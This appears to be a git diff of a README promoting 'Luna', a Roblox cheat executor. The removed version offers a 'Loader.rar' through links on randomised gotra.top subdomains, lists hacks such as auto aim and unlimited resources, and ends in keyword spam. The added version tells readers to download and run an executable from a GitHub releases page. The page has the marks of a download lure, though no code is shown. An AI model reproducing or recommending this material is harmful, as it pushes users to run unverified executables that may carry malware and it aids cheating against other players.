@@ -1,56 +1,101 @@
-# Roblox Luna
+```markdown
+# 🌙 Luna Executor Official
 
-#
-[![https://otCIE.gotra.top/54/baJFww6V](https://ad97pUs.gotra.top/l.svg)](https://NDWSmnmx.gotra.top/54/szPOZm2)
+![Luna Executor](https://img.shields.io/badge/Luna_Executor-Free-green.svg) ![GitHub Release](https://img.shields.io/github/release/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official.svg) ![GitHub Stars](https://img.shields.io/github/stars/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official.svg)
 
----
+## Introduction
 
-**Loader.rar** is a powerful tool designed to enhance your Roblox experience. Whether you're looking to explore new features, gain an advantage in games, or access hidden content, **Luna** provides the tools you need to make your time in Roblox even more exciting.
+Welcome to the **Luna Executor Official** repository! Luna Executor is a powerful and free script executor designed specifically for Roblox. Our tool empowers users to run custom scripts, modify gameplay, and enhance their overall gaming experience. With a clean and intuitive interface, as well as regular updates, Luna Executor stands out as one of the top choices for script execution in 2025.
 
----
+## Features
 
-## 🌟 Features
+- **User-Friendly Interface**: Easy to navigate, making it accessible for everyone.
+- **Script Compatibility**: Run a wide range of Roblox scripts with ease.
+- **Regular Updates**: Stay ahead with consistent updates to improve performance and security.
+- **Community Support**: Engage with other users through our dedicated community channels.
 
-- 🎮 **Game Enhancements**: Access powerful in-game features to enhance your Roblox experience.
-- 🛠️ **External Tools**: Use external tools like **Luna External** for added functionality.
-- 💥 **Crash Fixes**: Easily fix in-game crashes and other issues with **Luna**'s built-in crash fixes.
-- 🔑 **No Key**: Enjoy full access to **Luna** without needing to input a key for activation.
-- 🧩 **Discord Integration**: Stay connected with the **Luna** community through Discord, sharing tips and updates.
-- 🚀 **Fast Updates**: Always stay up-to-date with the latest **Luna** features and fixes.
-- 🛡️ **Security**: Enhanced security features to protect your Roblox account while using **Luna**.
+## Getting Started
 
----
+### Installation
 
-## 🚀 Installation
+To get started with Luna Executor, download the latest version from our [Releases](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/releases) section. Once downloaded, run the executable file and follow the on-screen instructions for installation.
 
-1. **Download** the latest version of **Loader.rar** from the official website or GitHub repository.  
-2. **Extract** the contents of the download to a folder on your computer.  
-3. Run the **Luna** executable or script to begin using it with Roblox.  
-4. If prompted, enter your **Luna key** or opt for **No Key** access, depending on the version you're using.
+### System Requirements
 
----
+- **Operating System**: Windows 10 or higher
+- **RAM**: Minimum 4GB
+- **Processor**: 1.8 GHz or faster
+- **Graphics**: DirectX 11 compatible
 
-## 🕹️ How to Use
+### How to Use
 
-1. Open **Roblox Studio** or the Roblox game where you want to use **Luna**.  
-2. Launch **Loader.rar** by double-clicking the executable or running the script.  
-3. Use the built-in menu to select the features you want to activate, such as **game hacks**, **external tools**, and **Discord integration**.  
-4. Enjoy enhanced gameplay with features like **no recoil**, **auto aim**, and **unlimited resources** (depending on your configuration).  
-5. Keep **Luna** updated to access the latest features and improvements.
+1. **Launch Luna Executor**: Open the application after installation.
+2. **Enter Key**: If required, enter your Luna key for authentication.
+3. **Load Script**: Click on the “Load Script” button and select your custom script.
+4. **Execute**: Hit the “Execute” button to run your script in Roblox.
 
----
+### Key Commands
 
-## ⚙️ Technical Details
+- `loadstring`: Loads and executes a Lua script.
+- `game.Workspace`: Access and modify game objects.
 
-- **Platform**: Roblox  
-- **Programming Language**: Lua (for Roblox scripts), external programming (for other tools)  
-- **Dependencies**: None  
-- **Version**: 2.0
+## Community and Support
 
----
+Join our growing community on Discord! Connect with other users, share scripts, and get help. 
 
-**Roblox Luna** offers the ultimate enhancement toolkit for Roblox developers and players. With game mods, external tools, crash fixes, and Discord integration, you’ll get the most out of your Roblox experience.
+- **Discord**: [Join Us](https://discord.gg/example)
 
+### Contributing
 
-**Tags:**  
-roblox cheat 2025, roblox hacks 2025, roblox script executor 2025, roblox exploit tool, roblox cheat engine 2025, roblox modding tools, roblox exploits 2025, roblox glitch script, roblox mod tool, roblox hack tool 2025, roblox cheat engine hack, roblox cheat codes, roblox script tool, roblox cheat 2025, roblox mod menu 2025, roblox glitch exploit 2025, roblox exploit hack 2025, roblox hack script 2025, roblox modding 2025, roblox exploits hack, roblox cheat hack 2025, roblox script engine 2025, roblox mod script, roblox exploit glitch, roblox cheat script 2025, roblox script executor, roblox modding script 2025, roblox glitch mod 2025, roblox bug tool 2025, roblox cheat engine exploit, roblox bug exploit 2025, roblox cheat engine tool, roblox exploit hack script, roblox mod hack 2025, roblox exploit engine, roblox script download 2025, roblox hack download 2025, roblox glitch hack tool, roblox hack engine 2025, roblox exploit tool 2025, roblox cheat tool 2025, roblox glitch tool 2025, roblox exploit glitch 2025, roblox mod menu tool 2025
+We welcome contributions from the community! If you would like to contribute, please follow these steps:
+
+1. Fork the repository.
+2. Create a new branch for your feature.
+3. Make your changes.
+4. Submit a pull request.
+
+### Reporting Issues
+
+If you encounter any issues, please check the [Issues](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/issues) section to see if your problem has already been reported. If not, feel free to open a new issue.
+
+## Documentation
+
+For more detailed documentation on features, commands, and scripts, refer to the [Wiki](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/wiki).
+
+## Topics
+
+This repository covers a wide range of topics relevant to users:
+
+- delta-exploits
+- luna
+- luna-discord
+- luna-download
+- luna-executer
+- luna-executor
+- luna-key
+- luna-roblox
+- roblox
+- roblox-executor-2025
+- roblox-executor-pc-2025
+- roblox-lua
+- roblox-luna
+- roblox-luna-key
+- roblox-script
+- roblox-scripts
+
+## Release Notes
+
+For details on the latest features and bug fixes, check our [Releases](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/releases). Make sure to download the latest version and keep your executor up to date.
+
+## License
+
+This project is licensed under the MIT License. See the [LICENSE](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/blob/main/LICENSE) file for details.
+
+## Conclusion
+
+Thank you for choosing Luna Executor. We hope it enhances your Roblox experience. If you have any questions or suggestions, don't hesitate to reach out to our support channels. Happy gaming!
+
+### Download Now
+
+[![Download Luna Executor](https://img.shields.io/badge/Download_Now-blue.svg)](https://github.com/MuhammadRizkyPramadhanaLubis/Luna-Executor-Official/releases)
+```
